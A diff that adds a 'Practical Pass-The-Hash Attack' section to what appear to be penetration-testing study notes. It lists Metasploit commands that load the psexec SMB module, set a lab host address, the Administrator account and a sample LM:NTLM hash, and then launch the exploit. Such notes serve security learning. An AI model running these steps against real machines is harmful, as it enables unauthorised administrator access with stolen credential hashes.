@@ -334,3 +334,13 @@ Pass-the-hash is an exploitation technique that involves capturing or harvesting
 This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation.
 
 ### Practical Pass-The-Hash Attack
+
+For this module you need the LM Hash in addition to the NTLM hash. You can just type in `hash dump` and it displays both hashes.
+- `service postgresql start && msfconsole`
+- `use exploit/windows/smb/psexec`
+- `set LPORT ` to another port than the currently running session
+- `set RHOST 10.2.28.132`
+- `set SMBUser Administrator`
+- `set SMBPass (LM + NTLM Hash of the target machine)` Example: aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d
+- `set target Command or Native\ upload`
+- `exploit`
